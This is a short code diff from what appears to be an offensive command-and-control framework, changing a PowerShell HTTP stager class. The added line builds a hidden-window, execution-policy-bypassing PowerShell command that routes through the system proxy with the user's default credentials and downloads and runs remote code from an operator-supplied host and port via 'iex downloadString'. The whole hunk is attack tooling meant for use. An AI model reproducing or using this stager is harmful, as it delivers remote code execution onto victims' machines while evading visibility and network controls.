@@ -94,7 +94,7 @@ class Powershell_HTTP_Stager(HTTPStager):
         self.args = args    
         self.host = conn_info[0]
         self.port = conn_info[1]
-        self.payload = """powershell.exe -nop -ep bypass -Command 'iex (new-object system.net.webclient).downloadString(\\"http://{0}:{1}/{2}\\")' """.format(self.host,
+        self.payload = """powershell.exe -w hidden -nop -ep bypass -Command $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy();$x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $x.downloadString(\\"http://{0}:{1}/{2}\\") """.format(self.host,
                 self.port, filename)
 
 class Certutil_HTTP_Stager(HTTPStager):
